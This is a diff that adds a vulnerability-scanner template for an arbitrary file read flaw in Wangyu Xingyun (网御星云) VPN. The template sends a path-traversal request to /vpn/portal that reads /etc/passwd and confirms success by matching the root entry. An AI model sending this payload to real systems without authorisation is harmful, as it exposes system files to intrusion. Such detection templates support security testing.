@@ -1,0 +1,11 @@
+name: wangyu-vpn-fileread
+rules:
+  - method: GET
+    path: "/vpn/portal?alias_name=../../../etc/passwd"
+    expression: |
+      response.status == 200 && "root:.*:0:0:".bmatches(response.body)
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "网御星云VPN 任意文件读取漏洞"
